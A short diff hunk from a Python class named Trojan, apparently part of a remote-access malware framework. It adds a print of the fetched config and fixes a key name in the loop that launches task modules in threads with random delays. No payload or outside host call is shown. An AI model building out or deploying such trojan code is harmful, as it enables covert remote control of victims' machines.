@@ -53,8 +53,9 @@ class Trojan:
     def run(self):
         while True:
             config=self.get_config()
+            print(config)
             for task in config:
-                thread = threading.Thread(target=self.module_runer,args=(task['modules'],))
+                thread = threading.Thread(target=self.module_runer,args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1,10))
 
